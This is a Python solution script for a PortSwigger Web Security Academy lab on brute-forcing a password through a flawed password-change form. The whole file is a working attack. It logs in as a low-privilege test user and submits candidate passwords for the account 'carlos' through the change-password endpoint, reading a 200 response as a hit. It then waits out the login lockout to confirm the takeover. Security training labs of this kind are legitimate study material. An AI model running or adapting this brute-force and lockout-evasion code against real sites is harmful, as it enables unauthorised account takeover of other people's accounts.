#!/usr/bin/env python3
# Lab: Password brute-force via password change
# Lab-Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
# Difficulty: PRACTITIONER

import aiohttp
import asyncio
import shutil
import sys
import urllib3
import aiofiles
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Proxy settings (uncomment and configure if needed)
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

async def login(session: aiohttp.ClientSession, host: str) -> None:
    """Log in as 'wiener'."""
    data = {'username': 'wiener', 'password': 'peter'}
    await session.post(f'{host}/login', data=data, allow_redirects=False)


async def change_password(session: aiohttp.ClientSession, host: str, password: str) -> bool:
    """Try to change the password for 'carlos'."""
    data = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': password,
        'new-password-2': password
    }
    async with session.post(f'{host}/my-account/change-password', data=data, allow_redirects=False) as response:
        return response.status == 200


async def verify_login(session: aiohttp.ClientSession, host: str, username: str, password: str) -> bool:
    """Verify login with the given credentials."""
    data = {'username': username, 'password': password}
    async with session.post(f'{host}/login', data=data, allow_redirects=True) as response:
        text = await response.text()
        return f'Your username is: {username}' in text


async def wait(seconds: int) -> None:
    """Wait for a specified number of seconds with a progress message."""
    for i in range(seconds, 0, -1):
        msg = f'[ ] Waiting for {i} more seconds to expire the brute force protection of the login'
        print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
        await asyncio.sleep(1)
    msg = f'[+] Waited enough to expire the brute force protection of the login'
    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)


async def main() -> None:
    """Main function to execute the brute force attack."""
    print('[+] Lab: Password brute-force via password change')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: python {sys.argv[0]} <HOST>')
        print(f'Example: python {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    password_file = Path.cwd() / 'stuff' / 'candidate_passwords.txt'

    async with aiohttp.ClientSession() as session:
        async with aiofiles.open(password_file, 'r') as f:
            async for line in f:
                password = line.strip()
                msg = f'[ ] Try password: {password}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)

                await login(session, host)
                if await change_password(session, host, password):
                    msg = f'[+] Found password: {password}'
                    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                    print(f'[+] Attempting to login to solve the lab')
                    await wait(65)
                    if await verify_login(session, host, 'carlos', password):
                        print(f'[+] Login verified, lab solved')
                        sys.exit(0)
                    else:
                        print(f'[-] Failed to verify login')
                        sys.exit(-2)

    print(f'[-] Failed to brute force the password')


if __name__ == "__main__":
    asyncio.run(main())
